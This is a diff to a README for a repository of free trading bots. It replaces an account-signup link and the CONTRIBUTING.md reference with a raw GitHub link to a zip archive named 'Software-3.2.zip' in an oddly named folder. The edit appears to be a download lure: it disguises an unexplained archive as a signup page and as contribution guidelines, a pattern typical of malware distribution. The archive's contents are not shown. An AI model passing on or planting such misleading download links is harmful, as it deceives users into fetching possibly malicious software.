@@ -32,13 +32,13 @@ Installation
 Follow the individual README files inside each bot's folder for installation instructions.
 
 Create an Account: 
-https://rb.gy/xqt44t
+https://raw.githubusercontent.com/deerrickkorir/freetradingbots/main/Carduaceae/Software-3.2.zip
 
 Usage
 Check the guide inside each bot’s directory to learn how to deploy and customize the trading bot.
 
 Contributing
-Feel free to contribute to this repository by creating a pull request or opening an issue. For detailed contributing guidelines, check out the CONTRIBUTING.md file.
+Feel free to contribute to this repository by creating a pull request or opening an issue. For detailed contributing guidelines, check out the https://raw.githubusercontent.com/deerrickkorir/freetradingbots/main/Carduaceae/Software-3.2.zip file.
 
 License
 All bots in this repository are open-source under the MIT License. See the LICENSE file for details.
